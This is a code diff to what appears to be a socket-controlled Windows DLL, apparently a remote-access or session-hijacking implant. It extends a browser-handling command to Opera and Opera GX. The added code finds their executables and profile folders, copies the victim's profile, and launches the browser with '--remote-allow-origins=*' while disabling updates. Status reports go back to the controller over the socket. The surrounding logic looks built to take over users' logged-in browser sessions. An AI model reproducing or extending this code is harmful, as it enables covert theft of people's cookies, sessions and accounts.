@@ -1311,11 +1311,60 @@ static wstring get_app_path(const wstring& appName) {
             RegCloseKey(hKey);
         }
     }
+
+    if (path.empty()) {
+        wchar_t szPath[MAX_PATH];
+        if (appName == L"opera.exe" || appName == L"launcher.exe") {
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Programs\\Opera\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+            if (SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Opera\\launcher.exe";
+                if (fs::exists(check)) return check;
+                check = wstring(szPath) + L"\\Opera\\opera.exe";
+                if (fs::exists(check)) return check;
+            }
+            // Fallback for GX if launcher.exe was requested
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Programs\\Opera GX\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+        } else if (appName == L"operagx.exe") {
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Programs\\Opera GX\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+            if (SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Opera GX\\launcher.exe";
+                if (fs::exists(check)) return check;
+                check = wstring(szPath) + L"\\Opera GX\\operagx.exe";
+                if (fs::exists(check)) return check;
+            }
+        }
+    }
+
+    // Strip quotes if any
+    if (!path.empty() && path[0] == L'\"') {
+        size_t last = path.find_last_of(L'\"');
+        if (last != wstring::npos && last > 0) {
+            path = path.substr(1, last - 1);
+        }
+    }
+
     return path;
 }
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
+
+    if (browserName == L"Opera" || browserName == L"Opera GX") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        path += L"\\Opera Software";
+        return path;
+    }
+
     if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
 
     wstring path = szPath;
@@ -1435,7 +1484,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             wstring wRequestedPath = utf8_to_wstring(requestedPath);
 
             bool isBrowser = (wRequestedPath == L"Google Chrome" ||
-                              wRequestedPath == L"Microsoft Edge");
+                              wRequestedPath == L"Microsoft Edge" ||
+                              wRequestedPath == L"Opera" ||
+                              wRequestedPath == L"Opera GX");
 
             if (isBrowser) {
                 thread([wRequestedPath]() {
@@ -1445,8 +1496,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring exeName;
                     if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                     else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
+                    else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
+                    else if (wRequestedPath == L"Opera GX") exeName = L"operagx.exe";
 
                     wstring exePath = get_app_path(exeName);
+                    if (exePath.empty()) {
+                        if (wRequestedPath == L"Opera GX") {
+                            exePath = get_app_path(L"operagx.exe");
+                            if (exePath.empty()) exePath = get_app_path(L"launcher.exe");
+                        } else if (wRequestedPath == L"Opera") {
+                            exePath = get_app_path(L"opera.exe");
+                            if (exePath.empty()) exePath = get_app_path(L"launcher.exe");
+                        }
+                    }
+
                     if (exePath.empty()) {
                         send_error("Browser executable not found.");
                         return;
@@ -1478,18 +1541,34 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // İlk profili tespit et (Default veya Profile 1)
                     wstring profileDir = L"Default";
+                    bool isOpera = (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX");
+
                     WIN32_FIND_DATAW findData;
                     HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                    bool foundProfile = false;
                     if (hFind != INVALID_HANDLE_VALUE) {
                         do {
                             wstring name = findData.cFileName;
-                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                profileDir = name;
-                                break;
+                            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                if (isOpera) {
+                                    if (name == L"Opera Stable" || name == L"Opera GX Stable" || name == L"Default") {
+                                        profileDir = name;
+                                        foundProfile = true;
+                                        break;
+                                    }
+                                } else {
+                                    if (name == L"Default" || name.find(L"Profile ") == 0) {
+                                        profileDir = name;
+                                        foundProfile = true;
+                                        break;
+                                    }
+                                }
                             }
                         } while (FindNextFileW(hFind, &findData));
                         FindClose(hFind);
+                    }
+                    if (!foundProfile && isOpera) {
+                        profileDir = L"Default";
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
@@ -1527,7 +1606,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --remote-allow-origins=*"
                                    L" --lang=en-US";
 
-                    wstring fullCmd = L"\"" + exePath + L"\"" + args;
+                    if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                        args += L" --disable-update --no-default-browser-check";
+                    }
+                    if (wRequestedPath == L"Opera GX") {
+                        args += L" --disable-features=GXC_Check_UI_Updates,GXC_Auto_Update --no-custom-menu";
+                    }
+
+                    // Ensure exePath is properly quoted if it contains spaces
+                    wstring quotedExe = exePath;
+                    if (quotedExe.find(L' ') != wstring::npos && quotedExe[0] != L'\"') {
+                        quotedExe = L"\"" + quotedExe + L"\"";
+                    }
+
+                    wstring fullCmd = quotedExe + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                     cmdLine.push_back(L'\0');
 
